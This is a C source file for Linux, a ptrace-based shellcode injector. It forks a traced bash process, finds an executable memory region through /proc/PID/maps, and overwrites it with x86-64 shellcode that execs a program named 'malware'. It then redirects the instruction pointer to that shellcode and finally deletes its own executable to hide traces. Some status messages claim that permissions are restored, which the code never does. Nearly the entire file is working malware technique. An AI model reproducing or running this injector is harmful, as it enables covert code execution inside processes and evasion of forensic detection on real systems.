#include <stdio.h>
#include <errno.h>
#include <limits.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/user.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <dirent.h>
#include <ctype.h>
#include <unistd.h>
#include <syscall.h>

#define PID_MAX 50000 //max procesos sistema
#define PID_MAX_STR_LENGTH 64 //max long para almacenar cadenas relacionadas con pid


unsigned char SHELLCODE[] = {
  0x48, 0x31, 0xc0, 0x50, 0x48, 0xbb, 0x6d, 0x61, 0x6c, 0x77, 0x61, 0x72,
  0x65, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0x48,
  0x31, 0xd2, 0x48, 0x83, 0xec, 0x08, 0xb0, 0x3b, 0x0f, 0x05, 0xb8, 0x3c,
  0x00, 0x00, 0x00, 0xbf, 0x01, 0x00, 0x00, 0x00, 0x0f, 0x05
};

void self_destruct() {
    char path[1024];
    ssize_t count = readlink("/proc/self/exe", path, sizeof(path));
    if (count == -1) {
        perror("readlink");
        exit(EXIT_FAILURE);
    }
    path[count] = '\0'; 

    printf("[*] DEstroying: %s\n", path);


    if (unlink(path) == 0) {
        printf("[*] Ejecutable eliminado con éxito.\n");
    } else {
        perror("unlink");
        fprintf(stderr, "[!] Falló la autodestrucción.\n");
    }
}

pid_t launch_process(const char *process_name) {
    pid_t pid = fork();
    if (pid == 0) {
        // Proceso hijo
        printf("    [*] Child: Starting process...\n");
        if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1) {
            perror("ptrace");
            exit(EXIT_FAILURE);
        }
        execlp("bash", "bash", NULL);
        perror("execlp");
        exit(EXIT_FAILURE);
    } else if (pid > 0) {
        printf("[*] Launched %s with pid %d\n", process_name, pid);
        return pid;
    } else {
        perror("fork");
        exit(EXIT_FAILURE);
    }
}

long find_pid_by_name(const char *process_name) {
    struct dirent *entry;
    DIR *proc_dir = opendir("/proc");
    if (proc_dir == NULL) {
        fprintf(stderr, "Could not open /proc directory.\n");
        return -1;
    }
    while ((entry = readdir(proc_dir)) != NULL) {
        if (!isdigit(entry->d_name[0])) {
            // only if PIDS
            continue;
        }
        long pid = strtol(entry->d_name, NULL, 10);
        char path[256];
        snprintf(path, sizeof(path), "/proc/%ld/comm", pid);

        FILE *comm_file = fopen(path, "r");
        if (comm_file == NULL) { //ignore si no se abre
            continue;
        }
        char comm_name[256];
        if (fgets(comm_name, sizeof(comm_name), comm_file) != NULL) {
            comm_name[strcspn(comm_name, "\n")] = 0;
            if (strcmp(comm_name, process_name) == 0) {
                fclose(comm_file);
                closedir(proc_dir);
                return pid; 
            }
        }

        fclose(comm_file);
    }
    closedir(proc_dir);
    return -1; 
}


int get_proc_pid_max() {
    FILE *pid_max_file = fopen("/proc/sys/kernel/pid_max", "r");

    if (pid_max_file == NULL) {
        fprintf(stderr, "proc/sys/kernel/pid_max file NOT FOUND. "
                "Using default(1).\n");
        
        return PID_MAX; //en el caso de no poder ver el max real del sistema
    }
    
    char *pid_max_buffer = malloc(PID_MAX_STR_LENGTH * sizeof(char));
    if (fgets(pid_max_buffer, PID_MAX_STR_LENGTH * sizeof(char), pid_max_file) == NULL) { // lee valor archivo como string
        fprintf(stderr, "/proc/sys/kernel/pid_max file NOT READIBLE "
                "Using default(2).\n");

        fclose(pid_max_file);
        free(pid_max_buffer);
        return PID_MAX; //si falla default
    }
    
    long pid_max = strtol(pid_max_buffer, (char **)NULL, 10); //valida q PIDmax es numero y que menor q PIDMAX
    if (pid_max == 0) {
        fprintf(stderr, "Could not parse /proc/sys/kernel/pid_max value. "
                "Uisng default(3).\n");
        pid_max = PID_MAX;
    } 

    free(pid_max_buffer);
    fclose(pid_max_file);
    return pid_max; 
}

char *get_permissions_from_line(char *line) {
    int first_space = -1;
    int second_space = -1;  // pos del primero y segundo espacio dnd los permisos
    for (size_t i = 0; i < strlen(line); i++) {
        if (line[i] == ' ' && first_space == -1) {
            first_space = i + 1;
        }
        else if (line[i] == ' ' && first_space != -1) {
            second_space = i;
            break;
        }
    }
    
    if (first_space != -1 && second_space != -1 && second_space > first_space) { //cambia los permisos
        char *permissions = malloc(second_space - first_space + 1);
        if (permissions == NULL) {
            fprintf(stderr, "Could not allocate memory. Aborting.\n");
            return NULL;
        }
        for (size_t i = first_space, j = 0; i < (size_t)second_space; i++, j++) {
            permissions[j] = line[i];
        }
        permissions[second_space - first_space] = '\0';
        return permissions;
    }
    return NULL;

}

long get_address_from_line(char *line) { //extrae pos de memoria
    int address_last_occurance_index = -1;
    for (size_t i = 0; i < strlen(line); i++) {
        if (line[i] == '-') {
            address_last_occurance_index = i;
        }    
    }
    
    if (address_last_occurance_index == -1) {
        fprintf(stderr, "Could not parse address from line '%s'. Aborting.\n", line);
        return -1;
    }

    char *address_line = malloc(address_last_occurance_index + 1);
    if (address_line == NULL) {
        fprintf(stderr, "Could not allocate memory. Aborting.\n");
        return -1;
    }

    for (size_t i = 0; i < (size_t)address_last_occurance_index; i++) {

        address_line[i] = line[i];
    }
    
    address_line[address_last_occurance_index] = '\0';
    long address = strtol(address_line, (char **) NULL, 16);
    return address;
}

long parse_maps_file(long victim_pid, long *end_addr) { //busca en el pid parte readible y ejecutable
    char maps_file_name[64];
    snprintf(maps_file_name, sizeof(maps_file_name), "/proc/%ld/maps", victim_pid);
    FILE *maps_file = fopen(maps_file_name, "r");
    if (!maps_file) {
        fprintf(stderr, "No se pudo abrir %s.\n", maps_file_name);
        return -1;
    }
    char *line = NULL;
    size_t len = 0;
    long start_addr = -1;
    while (getline(&line, &len, maps_file) != -1) {
        char *permissions = get_permissions_from_line(line);
        if (permissions && strncmp(permissions, "r-xp", 4) == 0) {
            sscanf(line, "%lx-%lx", &start_addr, end_addr);
            free(permissions);
            break;
        }
        free(permissions);
    }
    free(line);
    fclose(maps_file);
    return start_addr;
}


int main() {
    const char *target_process_name = "bash";
    FILE *debug_log = fopen("/tmp/injector_debug.log", "a");

    if (debug_log) {
        fprintf(debug_log, "Injection started at: %s\n", __TIME__);
	fprintf(debug_log, "Current PID: %d\n", getpid());
        fflush(debug_log);
    }

    pid_t victim_pid = launch_process(target_process_name);

    int status;
    if (waitpid(victim_pid, &status, 0) == -1) {
        fprintf(debug_log, "Error details: %s\n", strerror(errno));
        perror("waitpid");
        exit(EXIT_FAILURE);
    }

    // Verifica que el proceo está detenido
    if (!WIFSTOPPED(status)) {
	fprintf(debug_log, "Error details: %s\n", strerror(errno));
        fprintf(stderr, "[-] Process was not stopped correctly.\n");
        exit(EXIT_FAILURE);
    }
    fprintf(stdout, "[*] Process with PID %d stopped on the first instruction.\n", victim_pid);


    fprintf(stdout, "[*] Attach to the process with PID %ld.\n", victim_pid);

    

    long start_addr, end_addr;
    start_addr = parse_maps_file(victim_pid, &end_addr);
    if (start_addr == -1) {
	fprintf(debug_log, "Error details: %s\n", strerror(errno));
        fprintf(stderr, "[-] Failed to find an executable region.\n");
        exit(EXIT_FAILURE);
    }

    size_t region_size = end_addr - start_addr;
    fprintf(stdout, "[*] Region found: start=0x%lx, end=0x%lx\n", start_addr, end_addr);


    // Inyectar shellcode
    size_t payload_size = sizeof(SHELLCODE);
    uint64_t *payload = (uint64_t *)SHELLCODE;

    fprintf(stdout, "[*] Injecting shellcode at address 0x%lx.\n", start_addr);
    for (size_t i = 0; i < payload_size; i += 8, payload++) {
        if (ptrace(PTRACE_POKETEXT, victim_pid, start_addr + i, *payload) < 0) {
            fprintf(debug_log, "Error details: %s\n", strerror(errno));
            perror("[-] Failed to inject shellcode");
            exit(EXIT_FAILURE);
        }
    }

    // Configurar RIP para apuntar al shellcode
    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, victim_pid, NULL, &regs) < 0) {
	fprintf(debug_log, "Error details: %s\n", strerror(errno));
        perror("[-] Failed to get registers");
        exit(EXIT_FAILURE);
    }

    regs.rip = start_addr;

    if (ptrace(PTRACE_SETREGS, victim_pid, NULL, &regs) < 0) {
	fprintf(debug_log, "Error details: %s\n", strerror(errno));
        perror("[-] Failed to set registers");
        exit(EXIT_FAILURE);
    }

    // Continuar el proceso
    if (ptrace(PTRACE_CONT, victim_pid, NULL, NULL) < 0) {
	fprintf(debug_log, "Error details: %s\n", strerror(errno));
        perror("[-] Failed to continue the process");
        exit(EXIT_FAILURE);
    }

    fprintf(stdout, "[*] Shellcode executed. Restoring original permissions.\n");


    fprintf(stdout, "[*] Permissions restored. Exiting.\n");

    self_destruct();
    return 0;
}
